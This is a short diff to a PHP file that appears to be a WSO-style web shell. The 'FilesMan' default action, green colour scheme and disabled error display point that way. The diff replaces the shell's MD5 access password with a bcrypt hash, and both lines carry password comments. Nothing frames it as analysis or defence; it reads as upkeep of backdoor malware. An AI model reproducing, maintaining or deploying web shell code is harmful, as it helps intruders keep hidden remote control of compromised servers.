@@ -9,7 +9,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$auth_pass = "21232f297a57a5a743894a0e4a801fc3"; // akuncren
+$auth_pass = "$2y$10$5K9ONxqKPks07jFCmUtkIeC3s1SjVOfe0dPIUpAodpNnSwACGPQIa"; // congbumbumbong
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
